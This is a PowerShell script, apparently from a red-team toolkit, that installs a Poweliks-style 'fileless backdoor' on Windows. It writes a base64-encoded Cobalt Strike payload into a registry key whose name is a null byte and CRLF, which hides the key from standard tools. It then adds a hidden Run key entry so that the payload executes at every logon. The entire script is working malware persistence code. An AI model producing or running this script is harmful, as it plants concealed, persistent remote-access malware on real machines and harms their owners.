function Persist-Poweliks{
<#
.SYNOPSIS
This script adds a "fileless backdoor" in a similar manner seen by the Poweliks malware. 
Author: Jonathan Echavarria (@Und3rf10w)

.DESCRIPTION
This function creates a registry key with the name of "<nullbyte><CRLF>", that contains an entry named "<nullbyte><CRLF>", that contains a passed base64ed powershell command (payload).
In addition, a run key entry is created named "<nullbyte><CRLF>" at "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
that executes the stored payload.

For more information, see: https://isc.sans.edu/forums/diary/20823

.EXAMPLE
PS C:\> Persist-Poweliks -cobaltstrike_gen_payload <provided by cobalt strike>
#>

    [CmdletBinding()]
        Param(
        [Parameter(Mandatory=$True)]
        [string]$cobaltstrike_gen_payload
    )
    [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
    $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)

    $powershell_path = (Get-Process powershell | select -First 1).path

    #Write the malformed registry key
    new-item -path "HKLM:SOFTWARE\$malformed_string" -force

    #Write the powershell bytecode to a key, $malformed_string, in HKLM:SOFTWARE\$malformed_string
    new-ItemProperty -path "HKLM:SOFTWARE\$malformed_string" -name "$malformed_string" -value "$cobaltstrike_gen_payload"

    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "$powershell_path -windowstyle hidden -c `"`$val = (gp HKLM:SOFTWARE\`'$malformed_string`').`'$malformed_string`'; $powershell_path -windowstyle hidden -ec `$val`""
} 